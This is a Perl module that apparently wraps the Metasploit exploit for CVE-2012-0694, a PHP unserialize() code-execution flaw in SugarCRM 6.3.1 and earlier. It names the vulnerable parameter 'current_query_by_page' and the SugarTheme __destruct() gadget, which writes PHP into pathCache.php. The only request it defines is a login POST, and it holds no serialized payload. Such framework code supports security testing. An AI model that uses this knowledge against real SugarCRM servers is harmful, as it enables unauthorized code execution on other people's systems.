package SUGARCRM::MSF::SugarcrmUnserializeExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SugarcrmUnserializeExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-0694",
  DESCRIPTION => "

          This module exploits a php unserialize() vulnerability in SugarCRM <= 6.3.1

        which could be abused to allow authenticated SugarCRM users to execute arbitrary

        code with the permissions of the webserver.



        The dangerous unserialize() exists in the 'include/MVC/View/views/view.list.php'

        script, which is called with user controlled data from the 'current_query_by_page'

        parameter. The exploit abuses the __destruct() method from the SugarTheme class

        to write arbitrary PHP code to a 'pathCache.php' on the web root.

      ",
  MSF_MODULE => "sugarcrm_unserialize_exec",
  OSVDB => 83361,
  REFERENCES => [
    "http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/",
  ],
  TITLE => "SugarCRM unserialize() PHP Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'index.php',
      PAYLOAD      => 'module=Users&action=Authenticate&user_name=__USERNAME__&user_password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /index.php',
      HEADERS      => {
        'Cookie' => 'PHPSESSID=1',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
